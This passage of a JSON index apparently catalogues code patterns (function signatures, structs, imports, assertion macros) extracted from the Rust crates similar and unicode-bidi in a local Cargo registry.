          "use crate::algorithms::DiffHook;",
          "use crate::algorithms::{diff_slices, Algorithm};",
          "use crate::algorithms::{diff_slices, Algorithm};"
        ],
        "macros": [
          "debug_assert_eq!(old_index, del_old_index + del_old_len);",
          "debug_assert_eq!(ins_new_index + ins_new_len, new_index);",
          "insta::assert_debug_snapshot!(&d.into_inner().ops(), @r###\"",
          "insta::assert_debug_snapshot!(d.into_inner().ops(), @r###\""
        ],
        "derives": [],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/patience.rs",
        "function_defs": [
          "fn equal(&mut self, old: usize, new: usize, len: usize) -> Result<(), D::Error> {",
          "fn finish(&mut self) -> Result<(), D::Error> {",
          "fn test_patience() {",
          "fn test_patience_out_of_bounds_bug() {",
          "fn test_finish_called() {",
          "fn finish(&mut self) -> Result<(), Self::Error> {"
        ],
        "struct_defs": [
          "struct Patience<'old, 'new, 'd, Old: ?Sized, New: ?Sized, D> {",
          "struct HasRunFinish(bool);"
        ],
        "impl_blocks": [
          "impl DiffHook for HasRunFinish {"
        ],
        "uses": [
          "use std::hash::Hash;",
          "use std::ops::{Index, Range};",
          "use crate::algorithms::{myers, DiffHook, NoFinishHook, Replace};",
          "use crate::deadline_support::Instant;",
          "use super::utils::{unique, UniqueItem};"
        ],
        "macros": [
          "insta::assert_debug_snapshot!(d.into_inner().ops());",
          "insta::assert_debug_snapshot!(d.into_inner().ops());",
          "assert!(d.0);",
          "assert!(d.0);",
          "assert!(d.0);"
        ],
        "derives": [],
        "error_handling": 15
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/utils.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {",
          "fn eq(&self, other: &UniqueItem<'a, A>) -> bool {",
          "fn index(&self, index: usize) -> &Self::Output {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn eq(&self, other: &Self) -> bool {",
          "fn test_unique() {",
          "fn test_int_hasher() {",
          "fn test_common_prefix_len() {",
          "fn test_common_suffix_len() {"
        ],
        "struct_defs": [
          "struct OffsetLookup<Int> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::collections::hash_map::Entry;",
          "use std::collections::HashMap;",
          "use std::fmt::Debug;",
          "use std::hash::{Hash, Hasher};",
          "use std::ops::{Add, Index, Range};"
        ],
        "macros": [
          "assert_eq!(u, vec![('a', 0), ('c', 2)]);",
          "assert_eq!(ih.old_lookup()[1], 0);",
          "assert_eq!(ih.old_lookup()[2], 1);",
          "assert_eq!(ih.old_lookup()[3], 2);",
          "assert_eq!(ih.new_lookup()[1], 0);",
          "assert_eq!(ih.new_lookup()[2], 3);",
          "assert_eq!(ih.new_lookup()[3], 2);",
          "assert_eq!(ih.old_range(), 1..4);",
          "assert_eq!(ih.new_range(), 1..4);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 23
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/algorithms/capture.rs",
        "function_defs": [
          "fn equal(&mut self, old_index: usize, new_index: usize, len: usize) -> Result<(), Self::Error> {",
          "fn delete(",
          "fn insert(",
          "fn replace(",
          "fn test_capture_hook_grouping() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Capture {",
          "impl DiffHook for Capture {"
        ],
        "uses": [
          "use std::convert::Infallible;",
          "use crate::algorithms::DiffHook;",
          "use crate::{group_diff_ops, DiffOp};",
          "use crate::algorithms::{diff_slices, Algorithm, Replace};"
        ],
        "macros": [
          "insta::assert_debug_snapshot!(ops);",
          "insta::assert_debug_snapshot!(tags);"
        ],
        "derives": [
          "#[derive(Default, Clone)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/text/abstraction.rs",
        "function_defs": [
          "fn as_diffable_str(&self) -> &Self::Output;",
          "fn as_diffable_str(&self) -> &T {",
          "fn as_diffable_str(&self) -> &str {",
          "fn as_diffable_str(&self) -> &T {",
          "fn tokenize_lines(&self) -> Vec<&Self>;",
          "fn tokenize_lines_and_newlines(&self) -> Vec<&Self>;",
          "fn tokenize_words(&self) -> Vec<&Self>;",
          "fn tokenize_chars(&self) -> Vec<&Self>;",
          "fn tokenize_unicode_words(&self) -> Vec<&Self>;",
          "fn tokenize_graphemes(&self) -> Vec<&Self>;",
          "fn as_str(&self) -> Option<&str>;",
          "fn to_string_lossy(&self) -> Cow<'_, str>;",
          "fn ends_with_newline(&self) -> bool;",
          "fn len(&self) -> usize;",
          "fn slice(&self, rng: Range<usize>) -> &Self;",
          "fn as_bytes(&self) -> &[u8];",
          "fn is_empty(&self) -> bool {",
          "fn tokenize_lines(&self) -> Vec<&Self> {",
          "fn tokenize_lines_and_newlines(&self) -> Vec<&Self> {",
          "fn tokenize_words(&self) -> Vec<&Self> {",
          "fn tokenize_chars(&self) -> Vec<&Self> {",
          "fn tokenize_unicode_words(&self) -> Vec<&Self> {",
          "fn tokenize_graphemes(&self) -> Vec<&Self> {",
          "fn as_str(&self) -> Option<&str> {",
          "fn to_string_lossy(&self) -> Cow<'_, str> {",
          "fn ends_with_newline(&self) -> bool {",
          "fn len(&self) -> usize {",
          "fn slice(&self, rng: Range<usize>) -> &Self {",
          "fn as_bytes(&self) -> &[u8] {",
          "fn as_diffable_str(&self) -> &[u8] {",
          "fn tokenize_lines(&self) -> Vec<&Self> {",
          "fn tokenize_lines_and_newlines(&self) -> Vec<&Self> {",
          "fn tokenize_words(&self) -> Vec<&Self> {",
          "fn tokenize_unicode_words(&self) -> Vec<&Self> {",
          "fn tokenize_graphemes(&self) -> Vec<&Self> {",
          "fn tokenize_chars(&self) -> Vec<&Self> {",
          "fn as_str(&self) -> Option<&str> {",
          "fn to_string_lossy(&self) -> Cow<'_, str> {",
          "fn ends_with_newline(&self) -> bool {",
          "fn len(&self) -> usize {",
          "fn slice(&self, rng: Range<usize>) -> &Self {",
          "fn as_bytes(&self) -> &[u8] {",
          "fn test_split_lines() {",
          "fn test_split_words() {",
          "fn test_split_chars() {",
          "fn test_split_graphemes() {",
          "fn test_split_lines_bytes() {",
          "fn test_split_words_bytes() {",
          "fn test_split_chars_bytes() {",
          "fn test_split_graphemes_bytes() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl DiffableStrRef for String {",
          "impl DiffableStr for str {",
          "impl DiffableStrRef for Vec<u8> {",
          "impl DiffableStr for [u8] {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::hash::Hash;",
          "use std::ops::Range;",
          "use super::*;",
          "use bstr::ByteSlice;"
        ],
        "macros": [
          "matches!(self.last_byte(), Some(b'\\r') | Some(b'\\n'))",
          "assert_eq!(",
          "assert_eq!(DiffableStr::tokenize_lines(\"\\n\\n\"), vec![\"\\n\", \"\\n\"]);",
          "assert_eq!(DiffableStr::tokenize_lines(\"\\n\"), vec![\"\\n\"]);",
          "assert!(DiffableStr::tokenize_lines(\"\").is_empty());",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert!(DiffableStr::tokenize_lines(\"\".as_bytes()).is_empty());",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/text/mod.rs",
        "function_defs": [
          "fn into_instant(self) -> Option<Instant> {",
          "fn diff<'old, 'new, 'bufs, T: DiffableStr + ?Sized>(",
          "fn test_captured_ops() {",
          "fn test_captured_word_ops() {",
          "fn test_unified_diff() {",
          "fn test_line_ops() {",
          "fn test_virtual_newlines() {",
          "fn test_char_diff() {",
          "fn test_ratio() {",
          "fn test_get_close_matches() {",
          "fn test_lifetimes_on_iter() {",
          "fn diff_lines<'x, T>(old: &'x T, new: &'x T) -> Vec<Change<&'x T::Output>>",
          "fn test_serde() {",
          "fn test_serde_ops() {",
          "fn test_regression_issue_37() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Deadline {",
          "impl TextDiffConfig {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::cmp::Reverse;",
          "use std::collections::BinaryHeap;",
          "use std::time::Duration;",
          "use self::utils::{upper_seq_ratio, QuickSeqRatio};",
          "use crate::algorithms::IdentifyDistinct;",
          "use crate::deadline_support::{duration_to_deadline, Instant};",
          "use crate::iter::{AllChangesIter, ChangesIter};",
          "use crate::udiff::UnifiedDiff;",
          "use crate::{capture_diff_deadline, get_diff_ratio, group_diff_ops, Algorithm, DiffOp};",
          "use crate::deadline_support::duration_to_deadline;",
          "use crate::Change;"
        ],
        "macros": [
          "/// assert_eq!(changes, vec![",
          "/// assert_eq!(changes, vec![",
          "/// assert_eq!(changes, vec![",
          "/// assert_eq!(changes, vec![",
          "/// assert_eq!(changes, vec![",
          "/// assert_eq!(changes, vec![",
          "/// assert_eq!(diff.ratio(), 0.75);",
          "/// assert_eq!(matches, vec![\"apple\", \"ape\"]);",
          "insta::assert_debug_snapshot!(&diff.ops());",
          "insta::assert_debug_snapshot!(&changes);",
          "assert!(diff.newline_terminated());",
          "insta::assert_snapshot!(&diff",
          "assert!(diff.newline_terminated());",
          "insta::assert_debug_snapshot!(&changes);",
          "assert_eq!(change.to_string_lossy(), byte_change.to_string_lossy());",
          "assert!(diff.newline_terminated());",
          "insta::assert_debug_snapshot!(&changes);",
          "insta::assert_debug_snapshot!(diff.ops());",
          "assert_eq!(diff.ops(), byte_diff.ops());",
          "assert_eq!(diff.ratio(), 0.75);",
          "assert_eq!(diff.ratio(), 1.0);",
          "assert_eq!(matches, vec![\"apple\", \"ape\"]);",
          "assert_eq!(matches, vec![\"aulo\", \"hulu\", \"uulo\", \"zulo\"]);",
          "insta::assert_debug_snapshot!(&changes);",
          "insta::assert_snapshot!(&json);",
          "insta::assert_snapshot!(&json);",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Debug, Clone, Copy)]",
          "#[derive(Clone, Debug, Default)]"
        ],
        "error_handling": 19
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/text/inline.rs",
        "function_defs": [
          "fn new(strings: &'bufs [&'s T]) -> MultiLookup<'bufs, 's, T> {",
          "fn get_original_slices(&self, idx: usize, len: usize) -> Vec<(usize, &'s T)> {",
          "fn index(&self, index: usize) -> &Self::Output {",
          "fn push_values<'s, T: DiffableStr + ?Sized>(",
          "fn from(change: Change<&'s T>) -> InlineChange<'s, T> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn test_line_ops_inline() {",
          "fn test_serde() {"
        ],
        "struct_defs": [
          "struct MultiLookup<'bufs, 's, T: DiffableStr + ?Sized> {"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::borrow::Cow;",
          "use std::fmt;",
          "use crate::deadline_support::Instant;",
          "use crate::text::{DiffableStr, TextDiff};",
          "use crate::types::{Algorithm, Change, ChangeTag, DiffOp, DiffTag};",
          "use crate::{capture_diff_deadline, get_diff_ratio};",
          "use std::ops::Index;",
          "use super::utils::upper_seq_ratio;"
        ],
        "macros": [
          "write!(f, \"{}{}{}\", marker, value, marker)?;",
          "writeln!(f)?;",
          "assert!(diff.newline_terminated());",
          "insta::assert_debug_snapshot!(&changes);",
          "assert!(diff.newline_terminated());",
          "insta::assert_snapshot!(&json);"
        ],
        "derives": [
          "#[derive(Debug, PartialEq, Eq, Hash, Clone, Ord, PartialOrd)]"
        ],
        "error_handling": 15
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/similar-2.7.0/src/text/utils.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::collections::HashMap;",
          "use std::hash::Hash;",
          "use super::DiffableStrRef;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 2
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18",
    "name": "unicode-bidi-0.3.18",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/implicit.rs",
        "function_defs": [
          "fn identify_bracket_pairs<'a, T: TextSource<'a> + ?Sized, D: BidiDataSource>(",
          "fn is_NI(class: BidiClass) -> bool {"
        ],
        "struct_defs": [
          "struct BracketPair {"
        ],
        "impl_blocks": [],
        "uses": [
          "use alloc::vec::Vec;",
          "use core::cmp::max;",
          "use smallvec::SmallVec;",
          "use super::char_data::BidiClass::{self, *};",
          "use super::level::Level;",
          "use super::prepare::{not_removed_by_x9, IsolatingRunSequence};",
          "use super::{BidiDataSource, TextSource};"
        ],
        "macros": [
          "debug_assert!(",
          "debug_assert!(",
          "debug_assert!(",
          "} else if matches!(class, BidiClass::EN | BidiClass::AN) {",
          "matches!(",
          "if matches!(previous_strong, BidiClass::EN | BidiClass::AN) {",
          "assert_eq!(processing_classes.len(), levels.len());",
          "matches!(class, B | S | WS | ON | FSI | LRI | RLI | PDI)"
        ],
        "derives": [],
        "error_handling": 17
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/deprecated.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::*;"
        ],
        "macros": [
          "assert!(line.start <= levels.len());",
          "assert!(line.end <= levels.len());"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/lib.rs",
        "function_defs": [
          "fn len(&self) -> usize;",
          "fn char_at(&self, index: usize) -> Option<(char, usize)>;",
          "fn subrange(&self, range: Range<usize>) -> &Self;",
          "fn chars(&'text self) -> Self::CharIter;",
          "fn char_indices(&'text self) -> Self::CharIndexIter;",
          "fn indices_lengths(&'text self) -> Self::IndexLenIter;",
          "fn char_len(ch: char) -> usize;",
          "fn compute_initial_info<'a, D: BidiDataSource, T: TextSource<'a> + ?Sized>(",
          "fn reorder_line(",
          "fn visual_runs_for_line(levels: Vec<Level>, line: &Range<usize>) -> (Vec<Level>, Vec<LevelRun>) {",
          "fn reorder_visual(levels: &[Level]) -> Vec<usize> {",
          "fn next_range(levels: &[level::Level], mut start_index: usize, max: Level) -> Range<usize> {",
          "fn compute_bidi_info_for_para<'a, D: BidiDataSource, T: TextSource<'a> + ?Sized>(",
          "fn reorder_levels<'a, T: TextSource<'a> + ?Sized>(",
          "fn para_direction(levels: &[Level]) -> Direction {",
          "fn assign_levels_to_removed_chars(para_level: Level, classes: &[BidiClass], levels: &mut [Level]) {",
          "fn get_base_direction_impl<'a, D: BidiDataSource, T: TextSource<'a> + ?Sized>(",
          "fn len(&self) -> usize {",
          "fn char_at(&self, index: usize) -> Option<(char, usize)> {",
          "fn subrange(&self, range: Range<usize>) -> &Self {",
          "fn chars(&'text self) -> Self::CharIter {",
          "fn char_indices(&'text self) -> Self::CharIndexIter {",
          "fn indices_lengths(&'text self) -> Self::IndexLenIter {",
          "fn char_len(ch: char) -> usize {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn to_utf16(s: &str) -> Vec<u16> {",
          "fn test_utf16_text_source() {",
          "fn test_utf16_char_iter() {",
          "fn test_initial_text_info() {",
          "fn test_process_text() {",
          "fn test_paragraph_bidi_info() {",
          "fn test_bidi_info_has_rtl() {",
          "fn reorder_paras(text: &str) -> Vec<Cow<'_, str>> {",
          "fn reorder_paras_u16(text: &[u16]) -> Vec<Cow<'_, [u16]>> {",
          "fn test_reorder_line() {",
          "fn reordered_levels_for_paras(text: &str) -> Vec<Vec<Level>> {",
          "fn reordered_levels_per_char_for_paras(text: &str) -> Vec<Vec<Level>> {",
          "fn reordered_levels_for_paras_u16(text: &[u16]) -> Vec<Vec<Level>> {",
          "fn reordered_levels_per_char_for_paras_u16(text: &[u16]) -> Vec<Vec<Level>> {",
          "fn test_reordered_levels_range() {",
          "fn test_reordered_levels() {",
          "fn test_paragraph_info_len() {",
          "fn test_direction() {",
          "fn test_edge_cases_direction() {",
          "fn test_level_at() {",
          "fn test_get_base_direction() {",
          "fn test_get_base_direction_full() {",
          "fn test_levels() {"
        ],
        "struct_defs": [
          "struct InitialInfoExt<'text> {",
          "struct ParagraphInfoFlags {"
        ],
        "impl_blocks": [
          "impl Sealed for str {}",
          "impl Sealed for [u16] {}",
          "impl ParagraphInfo {",
          "impl Iterator for Utf8IndexLenIter<'_> {"
        ],
        "uses": [
          "use alloc::borrow::Cow;",
          "use alloc::string::String;",
          "use alloc::vec::Vec;",
          "use core::char;",
          "use core::cmp;",
          "use core::iter::repeat;",
          "use core::ops::Range;",
          "use core::str::CharIndices;",
          "use smallvec::SmallVec;",
          "use crate::format_chars as chars;",
          "use crate::BidiClass::*;",
          "use super::*;",
          "use utf16::{",
          "use super::*;",
          "use serde_test::{assert_tokens, Token};"
        ],
        "macros": [
          "//! assert_eq!(bidi_info.paragraphs.len(), 1);",
          "//! assert_eq!(para.level.number(), 1);",
          "//! assert_eq!(para.level.is_rtl(), true);",
          "//! assert_eq!(display, concat![",
          "debug_assert!(",
          "debug_assert_eq!(paragraphs.len(), flags.len());",
          "debug_assert_eq!(original_classes.len(), text.len());",
          "assert!(line.start <= self.levels.len());",
          "assert!(line.end <= self.levels.len());",
          "/// assert_eq!(levels.len(), index_map.len());",
          "/// assert_eq!(index_map, [0, 1, 2, 3]);",
          "/// assert_eq!(levels.len(), index_map.len());",
          "/// assert_eq!(index_map, [0, 1, 2, 6, 7, 5, 4, 3]);",
          "assert!(line.start <= self.levels.len());",
          "assert!(line.end <= self.levels.len());",
          "assert_eq!(reset_to, None);",
          "assert_eq!(text.char_at(0), Some(('A', 1)));",
          "assert_eq!(text.char_at(1), Some(('\\u{10401}', 2)));",
          "assert_eq!(text.char_at(2), None);",
          "assert_eq!(text.char_at(3), Some((' ', 1)));",
          "assert_eq!(text.char_at(4), Some((char::REPLACEMENT_CHARACTER, 1)));",
          "assert_eq!(text.char_at(5), Some((' ', 1)));",
          "assert_eq!(text.char_at(6), Some((char::REPLACEMENT_CHARACTER, 1)));",
          "assert_eq!(text.char_at(7), Some((' ', 1)));",
          "assert_eq!(text.char_at(8), Some((char::REPLACEMENT_CHARACTER, 1)));",
          "assert_eq!(text.char_at(9), Some((char::REPLACEMENT_CHARACTER, 1)));",
          "assert_eq!(text.char_at(10), None);",
          "assert_eq!(text.len(), 10);",
          "assert_eq!(text.chars().count(), 9);",
          "assert_eq!(chars.next(), Some('A'));",
          "assert_eq!(chars.next(), Some('\\u{10401}'));",
          "assert_eq!(chars.next(), Some(' '));",
          "assert_eq!(chars.next(), Some('\\u{FFFD}'));",
          "assert_eq!(chars.next(), Some(' '));",
          "assert_eq!(chars.next(), Some('\\u{FFFD}'));",
          "assert_eq!(chars.next(), Some(' '));",
          "assert_eq!(chars.next(), Some('\\u{FFFD}'));",
          "assert_eq!(chars.next(), Some('\\u{FFFD}'));",
          "assert_eq!(chars.next(), None);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(BidiInfo::new(t.0, t.1).has_rtl(), t.2);",
          "assert_eq!(BidiInfoU16::new(&to_utf16(t.0), t.1).has_rtl(), t.2);",
          "assert_eq!(reorder_paras(t.0), t.1);",
          "assert_eq!(reorder_paras_u16(&to_utf16(t.0)), expect_utf16);",
          "assert!(s.get(range.clone()).is_some());",
          "assert_eq!(reordered_levels_for_paras(t.0), t.1);",
          "assert_eq!(reordered_levels_per_char_for_paras(t.0), t.2);",
          "assert_eq!(reordered_levels_for_paras_u16(text), t.3);",
          "assert_eq!(reordered_levels_per_char_for_paras_u16(text), t.2);",
          "assert_eq!(reordered_levels_for_paras(t.0), t.1);",
          "assert_eq!(reordered_levels_per_char_for_paras(t.0), t.2);",
          "assert_eq!(reordered_levels_for_paras_u16(text), t.3);",
          "assert_eq!(reordered_levels_per_char_for_paras_u16(text), t.2);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(bidi_info.paragraphs.len(), 1);",
          "assert_eq!(bidi_info.paragraphs[0].len(), text.len());",
          "let whole_text = format!(\"{}\\n{}\", text, text2);",
          "assert_eq!(bidi_info.paragraphs.len(), 2);",
          "assert_eq!(bidi_info.paragraphs[0].len(), text.len() + 1);",
          "assert_eq!(bidi_info.paragraphs[1].len(), text2.len());",
          "assert_eq!(bidi_info.paragraphs.len(), 1);",
          "assert_eq!(bidi_info.paragraphs[0].len(), text.len());",
          "assert_eq!(bidi_info.paragraphs.len(), 2);",
          "assert_eq!(bidi_info.paragraphs[0].len(), text.len() + 1);",
          "assert_eq!(bidi_info.paragraphs[1].len(), text2.len());",
          "let all_paragraphs = format!(\"{}\\n{}\\n{}{}\", ltr_text, rtl_text, ltr_text, rtl_t",
          "assert_eq!(bidi_info.paragraphs.len(), 3);",
          "assert_eq!(p_ltr.direction(), Direction::Ltr);",
          "assert_eq!(p_rtl.direction(), Direction::Rtl);",
          "assert_eq!(p_mixed.direction(), Direction::Mixed);",
          "assert_eq!(bidi_info.paragraphs.len(), 3);",
          "assert_eq!(p_ltr.direction(), Direction::Ltr);",
          "assert_eq!(p_rtl.direction(), Direction::Rtl);",
          "assert_eq!(p_mixed.direction(), Direction::Mixed);",
          "assert_eq!(bidi_info.paragraphs.len(), 0);",
          "assert_eq!(bidi_info.paragraphs.len(), 0);",
          "assert_eq!(bidi_info.paragraphs.len(), 1);",
          "assert_eq!(p.direction(), t.2);",
          "assert_eq!(p.direction(), t.2);",
          "let all_paragraphs = format!(\"{}\\n{}\\n{}{}\", ltr_text, rtl_text, ltr_text, rtl_t",
          "assert_eq!(bidi_info.paragraphs.len(), 3);",
          "assert_eq!(p_ltr.level_at(0), LTR_LEVEL);",
          "assert_eq!(p_rtl.level_at(0), RTL_LEVEL);",
          "assert_eq!(p_mixed.level_at(0), LTR_LEVEL);",
          "assert_eq!(p_mixed.info.levels.len(), 54);",
          "assert_eq!(p_mixed.para.range.start, 28);",
          "assert_eq!(p_mixed.level_at(ltr_text.len()), RTL_LEVEL);",
          "assert_eq!(bidi_info.paragraphs.len(), 3);",
          "assert_eq!(p_ltr.level_at(0), LTR_LEVEL);",
          "assert_eq!(p_rtl.level_at(0), RTL_LEVEL);",
          "assert_eq!(p_mixed.level_at(0), LTR_LEVEL);",
          "assert_eq!(p_mixed.info.levels.len(), 40);",
          "assert_eq!(p_mixed.para.range.start, 21);",
          "assert_eq!(p_mixed.level_at(ltr_text.len()), RTL_LEVEL);",
          "assert_eq!(get_base_direction(t.0), t.1);",
          "assert_eq!(get_base_direction(text.as_slice()), t.1);",
          "assert_eq!(get_base_direction_full(t.0), t.1);",
          "assert_eq!(get_base_direction_full(text.as_slice()), t.1);",
          "assert_eq!(text.as_bytes().len(), 10);",
          "assert_eq!(levels.len(), 10);"
        ],
        "derives": [
          "#[derive(PartialEq, Debug)]",
          "#[derive(Clone, Debug, PartialEq)]",
          "#[derive(PartialEq, Debug)]",
          "#[derive(PartialEq, Debug)]",
          "#[derive(PartialEq, Debug)]",
          "#[derive(Debug, PartialEq)]",
          "#[derive(Debug, PartialEq)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 21
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/explicit.rs",
        "function_defs": [],
        "struct_defs": [
          "struct Status {"
        ],
        "impl_blocks": [],
        "uses": [
          "use smallvec::{smallvec, SmallVec};",
          "use super::char_data::{",
          "use super::level::Level;",
          "use super::prepare::removed_by_x9;",
          "use super::LevelRunVec;",
          "use super::TextSource;"
        ],
        "macros": [
          "assert_eq!(text.len(), original_classes.len());",
          "let is_isolate = matches!(original_classes[i], RLI | LRI | FSI);",
          "while !matches!("
        ],
        "derives": [
          "#[derive(PartialEq)]"
        ],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/format_chars.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/data_source.rs",
        "function_defs": [
          "fn bidi_class(&self, c: char) -> BidiClass;",
          "fn bidi_matched_opening_bracket(&self, c: char) -> Option<BidiMatchedOpeningBracket> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::BidiClass;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Debug, Copy, Clone)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/prepare.rs",
        "function_defs": [
          "fn level_runs(levels: &[Level], original_classes: &[BidiClass]) -> Vec<LevelRun> {",
          "fn test_level_runs() {",
          "fn test_isolating_run_sequences() {",
          "fn test_isolating_run_sequences_sos_and_eos() {",
          "fn test_removed_by_x9() {",
          "fn test_not_removed_by_x9() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl IsolatingRunSequence {"
        ],
        "uses": [
          "use alloc::vec::Vec;",
          "use core::cmp::max;",
          "use core::ops::Range;",
          "use smallvec::{smallvec, SmallVec};",
          "use super::level::Level;",
          "use super::BidiClass::{self, *};",
          "use super::*;"
        ],
        "macros": [
          "assert!(!run.is_empty());",
          "assert!(!stack.is_empty());",
          "if matches!(end_class, RLI | LRI | FSI) {",
          "assert!(!sequence.is_empty());",
          "assert_eq!(seq_level, levels[idx]);",
          "let succ_level = if matches!(last_non_removed, RLI | LRI | FSI) {",
          "debug_assert!(runs[0].start <= pos && pos <= runs[0].end);",
          "debug_assert!(current.start <= pos && pos <= current.end);",
          "assert_eq!(levels.len(), original_classes.len());",
          "matches!(class, RLE | LRE | RLO | LRO | PDF | BN)",
          "assert_eq!(level_runs(&Level::vec(&[]), &[]), &[]);",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(removed_by_x9(*x), true);",
          "assert_eq!(removed_by_x9(*x), false);",
          "assert_eq!(not_removed_by_x9(&x), true);"
        ],
        "derives": [
          "#[derive(Debug, PartialEq)]"
        ],
        "error_handling": 7
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/utf16.rs",
        "function_defs": [
          "fn reorder_line(",
          "fn is_high_surrogate(code: u16) -> bool {",
          "fn is_low_surrogate(code: u16) -> bool {",
          "fn len(&self) -> usize {",
          "fn char_at(&self, index: usize) -> Option<(char, usize)> {",
          "fn subrange(&self, range: Range<usize>) -> &Self {",
          "fn chars(&'text self) -> Self::CharIter {",
          "fn char_indices(&'text self) -> Self::CharIndexIter {",
          "fn indices_lengths(&'text self) -> Self::IndexLenIter {",
          "fn char_len(ch: char) -> usize {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn next_back(&mut self) -> Option<Self::Item> {"
        ],
        "struct_defs": [
          "struct InitialInfoExt<'text> {"
        ],
        "impl_blocks": [
          "impl Iterator for Utf16IndexLenIter<'_> {",
          "impl Iterator for Utf16CharIndexIter<'_> {",
          "impl Iterator for Utf16CharIter<'_> {",
          "impl DoubleEndedIterator for Utf16CharIter<'_> {"
        ],
        "uses": [
          "use super::TextSource;",
          "use alloc::borrow::Cow;",
          "use alloc::vec::Vec;",
          "use core::char;",
          "use core::ops::Range;",
          "use crate::{",
          "use crate::{",
          "use crate::HardcodedBidiData;"
        ],
        "macros": [
          "assert!(line.start <= self.levels.len());",
          "assert!(line.end <= self.levels.len());",
          "/// assert_eq!(levels.len(), index_map.len());",
          "/// assert_eq!(index_map, [0, 1, 2, 3]);",
          "/// assert_eq!(levels.len(), index_map.len());",
          "/// assert_eq!(index_map, [0, 1, 2, 6, 7, 5, 4, 3]);",
          "assert!(line.start <= self.levels.len());",
          "assert!(line.end <= self.levels.len());",
          "debug_assert!(ch.len_utf16() == 2, \"BMP should have already been handled\");",
          "debug_assert!("
        ],
        "derives": [
          "#[derive(PartialEq, Debug)]",
          "#[derive(PartialEq, Debug)]",
          "#[derive(Debug, PartialEq)]",
          "#[derive(Debug, PartialEq)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
